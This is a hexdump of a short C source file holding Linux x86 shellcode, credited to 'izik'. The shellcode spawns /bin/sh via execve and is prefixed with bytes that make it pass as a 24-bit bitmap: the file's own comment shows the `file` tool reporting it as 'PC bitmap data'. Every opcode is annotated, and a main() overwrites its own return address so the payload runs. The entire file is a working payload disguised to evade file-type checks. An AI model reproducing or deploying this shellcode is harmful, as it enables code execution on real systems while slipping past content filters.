00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 2d 20 65 78 65  63 76 65 28 22 2f 62 69  |6) - execve("/bi|
00000020  6e 2f 73 68 22 2c 20 5b  22 2f 62 69 6e 2f 73 68  |n/sh", ["/bin/sh|
00000030  22 2c 20 4e 55 4c 4c 5d  29 20 2b 20 42 69 74 6d  |", NULL]) + Bitm|
00000040  61 70 20 32 34 62 69 74  20 48 65 61 64 65 72 20  |ap 24bit Header |
00000050  2d 20 32 37 20 62 79 74  65 73 0d 0a 20 2a 0d 0a  |- 27 bytes.. *..|
00000060  20 2a 20 72 6f 6f 74 40  6d 61 67 69 63 62 6f 78  | * root@magicbox|
00000070  3a 7e 23 20 66 69 6c 65  20 6c 69 6e 75 78 2d 73  |:~# file linux-s|
00000080  68 2d 62 6d 32 34 62 68  64 72 2e 62 69 6e 0d 0a  |h-bm24bhdr.bin..|
00000090  20 2a 20 6c 69 6e 75 78  2d 73 68 2d 62 6d 32 34  | * linux-sh-bm24|
000000a0  62 68 64 72 2e 62 69 6e  3a 20 50 43 20 62 69 74  |bhdr.bin: PC bit|
000000b0  6d 61 70 20 64 61 74 61  0d 0a 20 2a 0d 0a 20 2a  |map data.. *.. *|
000000c0  20 2d 20 69 7a 69 6b 20  3c 69 7a 69 6b 40 74 74  | - izik <izik@tt|
000000d0  79 36 34 2e 6f 72 67 3e  0d 0a 20 2a 2f 0d 0a 0d  |y64.org>.. */...|
000000e0  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
000000f0  5d 20 3d 20 0d 0a 0d 0a  09 2f 2f 0d 0a 09 2f 2f  |] = .....//...//|
00000100  20 42 69 74 6d 61 70 20  32 34 62 69 74 20 48 65  | Bitmap 24bit He|
00000110  61 64 65 72 20 28 34 20  62 79 74 65 73 29 0d 0a  |ader (4 bytes)..|
00000120  09 2f 2f 0d 0a 0d 0a 09  22 5c 78 34 32 22 20 20  |.//....."\x42"  |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000140  2f 2f 20 69 6e 63 20 25  65 64 78 20 0d 0a 09 22  |// inc %edx ..."|
00000150  5c 78 34 64 22 20 20 20  20 20 20 20 20 20 20 20  |\x4d"           |
00000160  20 20 20 20 20 20 20 2f  2f 20 64 65 63 20 25 65  |       // dec %e|
00000170  62 70 20 0d 0a 09 22 5c  78 33 36 22 20 20 20 20  |bp ..."\x36"    |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000190  20 73 73 20 0d 0a 09 22  5c 78 39 31 22 20 20 20  | ss ..."\x91"   |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000001b0  2f 20 78 63 68 67 20 25  65 61 78 2c 25 65 63 78  |/ xchg %eax,%ecx|
000001c0  20 0d 0a 0d 0a 09 2f 2f  0d 0a 09 2f 2f 20 65 78  | .....//...// ex|
000001d0  65 63 76 65 28 22 2f 62  69 6e 2f 73 68 22 2c 20  |ecve("/bin/sh", |
000001e0  5b 22 2f 62 69 6e 2f 73  68 22 2c 20 4e 55 4c 4c  |["/bin/sh", NULL|
000001f0  5d 29 3b 0d 0a 09 2f 2f  0d 0a 0d 0a 09 22 5c 78  |]);...//....."\x|
00000200  36 61 5c 78 30 62 22 20  20 20 20 20 20 20 20 20  |6a\x0b"         |
00000210  20 20 20 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |     // push $0x|
00000220  62 20 0d 0a 09 22 5c 78  35 38 22 20 20 20 20 20  |b ..."\x58"     |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000240  70 6f 70 20 25 65 61 78  20 0d 0a 09 22 5c 78 39  |pop %eax ..."\x9|
00000250  39 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |9"              |
00000260  20 20 20 20 2f 2f 20 63  6c 74 64 20 0d 0a 09 22  |    // cltd ..."|
00000270  5c 78 35 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x52"           |
00000280  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000290  65 64 78 20 0d 0a 09 22  5c 78 36 38 5c 78 32 66  |edx ..."\x68\x2f|
000002a0  5c 78 32 66 5c 78 37 33  5c 78 36 38 22 20 20 2f  |\x2f\x73\x68"  /|
000002b0  2f 20 70 75 73 68 20 24  30 78 36 38 37 33 32 66  |/ push $0x68732f|
000002c0  32 66 20 0d 0a 09 22 5c  78 36 38 5c 78 32 66 5c  |2f ..."\x68\x2f\|
000002d0  78 36 32 5c 78 36 39 5c  78 36 65 22 20 20 2f 2f  |x62\x69\x6e"  //|
000002e0  20 70 75 73 68 20 24 30  78 36 65 36 39 36 32 32  | push $0x6e69622|
000002f0  66 20 0d 0a 09 22 5c 78  38 39 5c 78 65 33 22 20  |f ..."\x89\xe3" |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000310  6d 6f 76 20 25 65 73 70  2c 25 65 62 78 20 0d 0a  |mov %esp,%ebx ..|
00000320  09 22 5c 78 35 32 22 20  20 20 20 20 20 20 20 20  |."\x52"         |
00000330  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000340  20 25 65 64 78 20 0d 0a  09 22 5c 78 35 33 22 20  | %edx ..."\x53" |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000360  20 2f 2f 20 70 75 73 68  20 25 65 62 78 20 0d 0a  | // push %ebx ..|
00000370  09 22 5c 78 38 39 5c 78  65 31 22 20 20 20 20 20  |."\x89\xe1"     |
00000380  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000390  25 65 73 70 2c 25 65 63  78 20 0d 0a 09 22 5c 78  |%esp,%ecx ..."\x|
000003a0  63 64 5c 78 38 30 22 3b  20 20 20 20 20 20 20 20  |cd\x80";        |
000003b0  20 20 20 20 20 2f 2f 20  69 6e 74 20 24 30 78 38  |     // int $0x8|
000003c0  30 20 0d 0a 0d 0a 69 6e  74 20 6d 61 69 6e 28 69  |0 ....int main(i|
000003d0  6e 74 20 61 72 67 63 2c  20 63 68 61 72 20 2a 2a  |nt argc, char **|
000003e0  61 72 67 76 29 20 7b 0d  0a 09 69 6e 74 20 2a 72  |argv) {...int *r|
000003f0  65 74 3b 0d 0a 09 72 65  74 20 3d 20 28 69 6e 74  |et;...ret = (int|
00000400  20 2a 29 26 72 65 74 20  2b 20 32 3b 0d 0a 09 28  | *)&ret + 2;...(|
00000410  2a 72 65 74 29 20 3d 20  28 69 6e 74 29 20 73 68  |*ret) = (int) sh|
00000420  65 6c 6c 63 6f 64 65 3b  0d 0a 7d                 |ellcode;..}|
0000042b
